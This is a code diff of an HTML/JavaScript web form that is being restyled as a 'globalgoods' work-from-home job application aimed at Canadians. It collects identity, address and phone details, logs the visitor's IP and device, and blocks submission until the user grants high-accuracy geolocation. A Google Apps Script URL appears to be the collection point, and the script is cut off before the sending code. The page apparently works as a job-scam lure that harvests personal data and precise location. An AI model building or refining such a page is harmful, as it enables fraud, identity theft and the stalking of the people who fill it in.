@@ -1,128 +1,192 @@
-<html lang="zh-CN">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Submit Information Verification</title>
+<title>globalgoods - Secure Information Verification</title>
+<!-- 引入高颜值的连笔手写英文字体 -->
+<link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&display=swap" rel="stylesheet">
 <style>
-:root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #dc2626; --error-bg: #fef2f2; --success: #16a34a; --warn: #f59e0b; }
+:root { 
+  --primary: #2563eb; 
+  --primary-hover: #1d4ed8;
+  --bg: #f8fafc; 
+  --card: #fff; 
+  --text: #1e293b; 
+  --border: #cbd5e1; 
+  --error: #dc2626; 
+  --error-bg: #fef2f2; 
+  --success: #16a34a; 
+  --warn: #f59e0b; 
+}
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px; }
-.container { background: var(--card); width: 100%; max-width: 540px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); }
-h2 { text-align: center; font-size: 22px; margin-bottom: 5px; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
+
+/* 顶部Logo与文案区域 (应用连笔手写字体) */
+.header-section { text-align: center; margin-bottom: 25px; width: 100%; max-width: 540px; }
+.logo-area { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; gap: 12px; }
+.logo__mark { width: 40px; height: 40px; object-fit: contain; }
+
+/* 使用连笔手写字体并优化字间距与粗细，实现完美连笔 */
+.logo__text { 
+  font-family: 'Caveat', cursive; 
+  font-size: 38px; 
+  font-weight: 700; 
+  color: #111827; 
+  letter-spacing: 0.5px; 
+  line-height: 1;
+}
+
+.main-title { font-size: 28px; font-weight: 800; color: #0f172a; line-height: 1.3; margin-bottom: 8px; }
+.main-title span { color: var(--primary); display: block; }
+.sub-desc { font-size: 13px; color: #64748b; margin-bottom: 16px; }
+
+/* 标签栏 */
+.tags-row { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
+.badge { background: #fff; border: 1px solid #e2e8f0; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; color: #475569; display: flex; align-items: center; gap: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
+
+/* 主体表单卡片 */
+.container { background: var(--card); width: 100%; max-width: 540px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(37, 99, 235, 0.08); border: 1px solid rgba(226, 232, 240, 0.8); }
+h2 { text-align: center; font-size: 22px; margin-bottom: 5px; color: #0f172a; font-weight: 700; }
 .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }
 .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
 .form-group { flex: 1; margin-bottom: 16px; }
-label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
-input, select { width: 100%; padding: 12px 14px; border: 2px solid var(--border); border-radius: 8px; font-size: 14px; }
-input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
+label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #334155; }
+input, select { width: 100%; padding: 12px 14px; border: 2px solid var(--border); border-radius: 10px; font-size: 14px; background: #fff; transition: all 0.2s; }
+input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
 input.invalid { border-color: var(--error); background: var(--error-bg); }
 .phone-group { display: flex; gap: 8px; }
-.btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-.btn:disabled { opacity: 0.6; cursor: not-allowed; }
-.btn-success { background: var(--success); margin-top: 20px; }
-.btn-warning { background: var(--warn); margin-top: 10px; }
+.btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25); transition: opacity 0.2s, transform 0.1s; }
+.btn:hover { opacity: 0.95; transform: translateY(-1px); }
+.btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+.btn-success { background: linear-gradient(135deg, #16a34a, #15803d); box-shadow: 0 4px 12px rgba(22, 163, 74, 0.25); margin-top: 20px; }
+.btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); box-shadow: 0 4px 12px rgba(245, 158, 11, 0.25); margin-top: 10px; }
 .hidden { display: none !important; }
-.loc-box { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 10px; padding: 18px; margin-bottom: 15px; color: #92400e; line-height: 1.7; }
+.loc-box { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 12px; padding: 18px; margin-bottom: 15px; color: #92400e; line-height: 1.7; }
 .step-item { margin: 8px 0; padding-left: 22px; position: relative; font-size: 14px; }
 .step-item::before { content: "🔒"; position: absolute; left: 0; top: 0; }
-.info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; }
+.info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 20px; margin-top: 10px; line-height: 1.8; font-size: 14px; }
 </style>
 </head>
 <body>
-<div class="container">
-  <div id="step-form">
-    <h2>Submit Information Verification</h2>
-    <div class="subtitle">Secure Verification Gateway</div>
-    <div class="form-row">
-      <div class="form-group">
-        <label>First Name *</label>
-        <input type="text" id="firstName" placeholder="e.g. John" oninput="validateField('firstName'); saveFormDraft()">
-      </div>
-      <div class="form-group">
-        <label>Last Name *</label>
-        <input type="text" id="lastName" placeholder="e.g. Doe" oninput="validateField('lastName'); saveFormDraft()">
-      </div>
+
+  <!-- 顶部标题与标签 (带连笔字效果的 globalgoods Logo) -->
+  <div class="header-section">
+    <div class="logo-area">
+      <img data-v-a13fdbf8="" class="logo__mark" src="https://foxexpress.org/assets/logo-ubJQS47I.png" alt="globalgoods" width="40" height="40">
+      <span data-v-a13fdbf8="" class="logo__text">globalgoods</span>
     </div>
-    <div class="form-row">
-      <div class="form-group">
-        <label>Age *</label>
-        <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="validateField('age'); saveFormDraft()">
+    <div class="main-title">
+      Your next task,
+      <span>starts here</span>
+    </div>
+    <div class="sub-desc">Fill in your application details to start exploring work-from-home opportunities tailored for you.</div>
+    <div class="tags-row">
+      <div class="badge">📦 Work From Home</div>
+      <div class="badge">⚡ Quick Fill</div>
+      <div class="badge">🔒 Secure Info</div>
+    </div>
+  </div>
+
+  <div class="container">
+    <div id="step-form">
+      <h2>Submit Information Verification</h2>
+      <div class="subtitle">Secure Verification Gateway</div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>First Name *</label>
+          <input type="text" id="firstName" placeholder="e.g. John" oninput="validateField('firstName'); saveFormDraft()">
+        </div>
+        <div class="form-group">
+          <label>Last Name *</label>
+          <input type="text" id="lastName" placeholder="e.g. Doe" oninput="validateField('lastName'); saveFormDraft()">
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>Age *</label>
+          <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="validateField('age'); saveFormDraft()">
+        </div>
+        <div class="form-group">
+          <label>Gender *</label>
+          <select id="gender" onchange="validateField('gender'); saveFormDraft()">
+            <option value="">-- Select --</option>
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+            <option value="Other">Other</option>
+          </select>
+        </div>
       </div>
       <div class="form-group">
-        <label>Gender *</label>
-        <select id="gender" onchange="validateField('gender'); saveFormDraft()">
-          <option value="">-- Select --</option>
-          <option value="Male">Male</option>
-          <option value="Female">Female</option>
-          <option value="Other">Other</option>
+        <label>Current Occupation *</label>
+        <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="validateField('occupation'); saveFormDraft()">
+      </div>
+      
+      <div style="font-weight: 700; font-size: 15px; margin: 20px 0 10px 0; color: #0f172a;">Location Information</div>
+      
+      <div class="form-group">
+        <label>Country / Region *</label>
+        <select disabled><option selected>Canada</option></select>
+      </div>
+      <div class="form-group">
+        <label>Province / Territory *</label>
+        <select id="province" onchange="validateField('province'); saveFormDraft()">
+          <option value="">-- Select Province --</option>
+          <option>Alberta</option><option>British Columbia</option><option>Manitoba</option><option>New Brunswick</option>
+          <option>Newfoundland and Labrador</option><option>Nova Scotia</option><option>Ontario</option><option>Prince Edward Island</option>
+          <option>Quebec</option><option>Saskatchewan</option><option>Northwest Territories</option><option>Nunavut</option><option>Yukon</option>
         </select>
       </div>
-    </div>
-    <div class="form-group">
-      <label>Current Occupation *</label>
-      <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="validateField('occupation'); saveFormDraft()">
-    </div>
-    <div class="form-group">
-      <label>Country / Region *</label>
-      <select disabled><option selected>Canada</option></select>
-    </div>
-    <div class="form-group">
-      <label>Province / Territory *</label>
-      <select id="province" onchange="validateField('province'); saveFormDraft()">
-        <option value="">-- Select Province --</option>
-        <option>Alberta</option><option>British Columbia</option><option>Manitoba</option><option>New Brunswick</option>
-        <option>Newfoundland and Labrador</option><option>Nova Scotia</option><option>Ontario</option><option>Prince Edward Island</option>
-        <option>Quebec</option><option>Saskatchewan</option><option>Northwest Territories</option><option>Nunavut</option><option>Yukon</option>
-      </select>
-    </div>
-    <div class="form-group">
-      <label>Street Address *</label>
-      <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="validateField('address'); saveFormDraft()">
-    </div>
-    <div class="form-row">
       <div class="form-group">
-        <label>City *</label>
-        <input type="text" id="city" placeholder="e.g. Toronto" oninput="validateField('city'); saveFormDraft()">
+        <label>Street Address *</label>
+        <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="validateField('address'); saveFormDraft()">
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>City *</label>
+          <input type="text" id="city" placeholder="e.g. Toronto" oninput="validateField('city'); saveFormDraft()">
+        </div>
+        <div class="form-group">
+          <label>Postal Code *</label>
+          <input type="text" id="zip" placeholder="e.g. A1A 1A1" oninput="validateField('zip'); saveFormDraft()">
+        </div>
       </div>
       <div class="form-group">
-        <label>Postal Code *</label>
-        <input type="text" id="zip" placeholder="e.g. A1A 1A1" oninput="validateField('zip'); saveFormDraft()">
+        <label>Phone Number *</label>
+        <div class="phone-group">
+          <select style="width: 80px;" disabled><option selected>+1</option></select>
+          <input type="tel" id="phone" placeholder="10 digits" oninput="validateField('phone'); saveFormDraft()">
+        </div>
       </div>
+      <button class="btn" onclick="goConfirm()">Next &rarr;</button>
     </div>
-    <div class="form-group">
-      <label>Phone Number *</label>
-      <div class="phone-group">
-        <select disabled><option selected>+1</option></select>
-        <input type="tel" id="phone" placeholder="10 digits" oninput="validateField('phone'); saveFormDraft()">
+
+    <!-- 第二步：信息确认与定位授权 -->
+    <div id="step-verification" class="hidden">
+      <h2>Confirm Information</h2>
+      <p style="text-align:center; color:#64748b; font-size:14px; margin-bottom:15px;">Please verify before submitting</p>
+      <div class="loc-box">
+        <strong>📍 Location Verification Required</strong>
+        We need your location to verify matches and calibrate address details.<br><br>
+        <strong>How to enable:</strong>
+        <div class="step-item">Tap the 🔒 lock icon near the address bar</div>
+        <div class="step-item">Find "Location" and set to <strong>"Allow"</strong></div>
+        <div class="step-item">Refresh the page (Draft data will be kept)</div>
       </div>
+      <div id="loc-status" class="loc-box hidden" style="background:#f0fdf4; border-color:#dcfce7; color:#166534;">✅ Location access granted</div>
+      <div class="info-card">
+        <p><strong>Name:</strong> <span id="disp-name"></span></p>
+        <p><strong>Gender:</strong> <span id="disp-gender"></span></p>
+        <p><strong>Age:</strong> <span id="disp-age"></span></p>
+        <p><strong>Occupation:</strong> <span id="disp-occupation"></span></p>
+        <p><strong>Address:</strong> <span id="disp-addr"></span></p>
+        <p><strong>Phone:</strong> +1 <span id="disp-phone"></span></p>
+        <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
+      </div>
+      <button id="btn-loc-retry" class="btn btn-warning" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
+      <button id="btn-submit" class="btn btn-success hidden" onclick="submitAll()">✅ Confirm & Submit</button>
     </div>
-    <button class="btn" onclick="goConfirm()">Next</button>
   </div>
-  <div id="step-verification" class="hidden">
-    <h2>Confirm Information</h2>
-    <p style="text-align:center; color:#64748b; font-size:14px; margin-bottom:15px;">Please verify before submitting</p>
-    <div class="loc-box">
-      <strong>📍 Location Verification Required</strong>
-      We need your location to verify matches and calibrate address details.<br><br>
-      <strong>How to enable:</strong>
-      <div class="step-item">Tap the 🔒 lock icon near the address bar</div>
-      <div class="step-item">Find "Location" and set to <strong>"Allow"</strong></div>
-      <div class="step-item">Refresh the page (Draft data will be kept)</div>
-    </div>
-    <div id="loc-status" class="loc-box hidden">✅ Location access granted</div>
-    <div class="info-card">
-      <p><strong>Name:</strong> <span id="disp-name"></span></p>
-      <p><strong>Gender:</strong> <span id="disp-gender"></span></p>
-      <p><strong>Age:</strong> <span id="disp-age"></span></p>
-      <p><strong>Occupation:</strong> <span id="disp-occupation"></span></p>
-      <p><strong>Address:</strong> <span id="disp-addr"></span></p>
-      <p><strong>Phone:</strong> +1 <span id="disp-phone"></span></p>
-      <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
-    </div>
-    <button id="btn-loc-retry" class="btn btn-warning" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
-    <button id="btn-submit" class="btn btn-success hidden" onclick="submitAll()">✅ Confirm & Submit</button>
-  </div>
-</div>
+
 <script>
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzLff9n4BbOkY3c_w6_4PUj3vyw3OXuFbXMht8FUAo30W-69dXJTaYZldlVSqe_4YI/exec";
 const urlParams = new URLSearchParams(window.location.search);
@@ -131,11 +195,13 @@ let form = {};
 let locationInfo = { lat: "", lng: "", ok: false };
 let ipAddr = "";
 let deviceInfo = { device: "", os: "", browser: "" };
+
 window.onload = () => {
   detectDevice();
   fetchIP();
   restoreFormDraft();
 };
+
 function saveFormDraft() {
   const draft = {
     firstName: document.getElementById("firstName").value,
@@ -151,6 +217,7 @@ function saveFormDraft() {
   };
   localStorage.setItem("formDraft", JSON.stringify(draft));
 }
+
 function restoreFormDraft() {
   try {
     const d = JSON.parse(localStorage.getItem("formDraft") || "{}");
@@ -159,6 +226,7 @@ function restoreFormDraft() {
     }
   } catch {}
 }
+
 function validateField(id) {
   const el = document.getElementById(id);
   const v = el.value.trim();
@@ -175,6 +243,7 @@ function validateField(id) {
   el.classList.toggle("invalid", v.length > 0 && !ok);
   return ok;
 }
+
 function goConfirm() {
   const fields = ["firstName","lastName","age","gender","occupation","province","address","city","zip","phone"];
   let allOk = true;
@@ -192,6 +261,7 @@ function goConfirm() {
     zip: document.getElementById("zip").value.trim().toUpperCase(),
     phone: document.getElementById("phone").value.trim().replace(/\D/g,"")
   };
+  document.querySelector(".header-section").classList.add("hidden");
   document.getElementById("step-form").classList.add("hidden");
   document.getElementById("step-verification").classList.remove("hidden");
   document.getElementById("disp-name").textContent = form.name;
@@ -202,6 +272,7 @@ function goConfirm() {
   document.getElementById("disp-phone").textContent = form.phone;
   document.getElementById("disp-zip").textContent = form.zip;
 }
+
 function requestLocation() {
   if(!navigator.geolocation) { alert("❌ Geolocation not supported"); return; }
   navigator.geolocation.getCurrentPosition(
@@ -223,6 +294,7 @@ function requestLocation() {
     { enableHighAccuracy: true, timeout: 15000 }
   );
 }
+
 async function fetchIP() {
   try {
     const r = await fetch("https://api.ipify.org?format=json");
@@ -230,6 +302,7 @@ async function fetchIP() {
     ipAddr = j.ip;
   } catch { ipAddr = "Unavailable"; }
 }
+
 function detectDevice() {
   const ua = navigator.userAgent;
   if(/iPhone/.test(ua)) deviceInfo = {device:"iPhone",os:"iOS",browser:"Safari"};
@@ -238,6 +311,7 @@ function detectDevice() {
   else if(/Windows/.test(ua)) deviceInfo = {device:"Windows PC",os:"Windows",browser:"Chrome"};
   else deviceInfo = {device:"Unknown",os:"Unknown",browser:"Unknown"};
 }
+
 async function submitAll() {
   if(!locationInfo.ok) { alert("❌ Please ALLOW location access first!"); return; }
   
